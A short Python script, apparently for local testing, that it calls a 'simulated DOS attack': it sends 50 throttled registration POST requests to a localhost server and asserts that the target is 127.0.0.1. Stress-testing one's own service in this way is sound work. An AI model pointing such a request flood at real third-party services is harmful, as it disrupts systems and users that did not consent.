import sys
import time
import requests

TARGET = "http://127.0.0.1:8000"
assert TARGET.startswith("http://127.0.0.1"), "Only run against localhost"

def run_dos_attack(username = "user1234", email = "user@gmail.com", password = "user1234", attempts = 50, delay = 0.2):
    print(f"Starting simulated DOS attack against ")
    start_time = time.time()
    for i in range(attempts):
        res = requests.post(
            f"{TARGET}/register",
            json={"username":username, "email":email, "password":password}
        )
        print(f"attempt {i + 1}: status {res.status_code}")
        time.sleep(delay)
    print(f"Done in {time.time() - start_time:.1f} seconds")

if __name__ == "__main__":
    run_dos_attack()
